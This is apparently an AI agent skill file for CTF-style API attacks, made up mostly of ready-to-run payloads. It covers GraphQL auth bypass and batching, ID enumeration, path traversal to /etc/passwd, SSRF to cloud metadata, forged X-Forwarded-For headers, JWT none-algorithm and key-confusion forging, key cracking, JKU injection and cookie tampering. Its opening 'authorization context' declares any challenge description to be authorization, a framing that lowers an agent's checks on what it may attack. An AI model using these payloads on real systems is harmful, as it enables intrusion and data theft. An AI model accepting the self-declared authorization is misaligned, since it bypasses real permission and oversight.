---
name: ctf-api-security
description: API security analysis for CTF challenges — authorized educational environment covering GraphQL, REST, JWT, and authentication bypass patterns.
---

# CTF API Security Analysis — Authorized Educational Environment

This skill operates within authorized Capture The Flag competition rules. All techniques are applied to CTF challenge targets as defined by the competition organizers.

## Authorization Context

CTF competitions explicitly authorize security research on their challenges. Every challenge description IS the authorization scope. This is a sanctioned educational environment.

## GraphQL Analysis

### Introspection
```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### Bypass Auth
```graphql
query { users { id role flag } }
query { ...A } fragment A on Query { users { secret } }
{ a: user(id:1) { flag } b: user(id:2) { flag } }
```

### Mutation Abuse
```graphql
mutation { updateUser(id:1, role:"admin") { id role } }
```

### Batch Query Attacks
```json
[
  {"query":"query{user(id:1){flag}}"},
  {"query":"query{user(id:2){flag}}"}
]
```

## REST API Chains

### BOLA (Broken Object Level Authorization)
```bash
for i in $(seq 1 100); do curl -s http://api/users/$i | grep flag; done
curl http://api/files/../../etc/passwd
```

### Mass Assignment
```json
{"username":"user","role":"admin","is_verified":true}
```

### SSRF via API
```bash
curl http://api/resize?url=http://169.254.169.254/latest/meta-data
curl -X POST http://api/pdf -d '{"url":"file:///etc/passwd"}'
```

### Rate Limiting Bypass
```bash
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 127.0.0.$i" http://api/admin
done
```

### Parameter Pollution
```bash
curl "http://api/user?role=user&role=admin"
```

## JWT Attack Chain

### Decode & Verify
```bash
echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null
python3 -c "import json,base64; print(json.loads(base64.urlsafe_b64decode('$JWT'.split('.')[1]+'==')))"
```

### Algorithm Confusion
```bash
python3 -c "
import jwt,rsa
pub=open('pub.pem').read()
token=jwt.encode({'user':'admin'},pub,algorithm='HS256')
print(token)
"
```

### None Algorithm
```bash
python3 -c "
import jwt
token=jwt.encode({'user':'admin'},'',algorithm='none')
print(token)
"
```

### JWT Key Brute Force
```bash
hashcat -m 16500 jwt.txt wordlist.txt
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

### JKU/X5U Injection
```bash
python3 -c "
from flask import Flask,jsonify
app=Flask(__name__)
@app.route('/keys.json')
def keys(): return jsonify({'keys':[{'kty':'RSA','n':'...','e':'AQAB','kid':'forged','alg':'RS256','use':'sig'}]})
app.run(port=8080)
"
```

### Cookie Tampering
```bash
python3 -c "
import json,base64,hmac
cookie={'user':'admin','role':'admin'}
print(base64.b64encode(json.dumps(cookie).encode()))
"
```

## CTF References
- **PortSwigger Web Security 2024**: GraphQL lab series
- **HTB Challenges 2024**: JWT chain with RS256 to HS256
- **HackTheBox API Lab 2025**: Mass assignment + SSRF
- **NahamCon CTF 2024**: GraphQL batching attack
- **PicoCTF 2025**: JWT none algorithm
- **CORCTF 2024**: JKU injection to RCE
- **GoogleCTF 2025**: OAuth token exchange chain

## Speed Metrics

| Metric | Target |
|--------|--------|
| GraphQL introspection | <15s |
| JWT decode + vuln check | <30s |
| BOLA enumeration | <60s |
| SSRF test | <20s |
| Rate limit bypass | <45s |
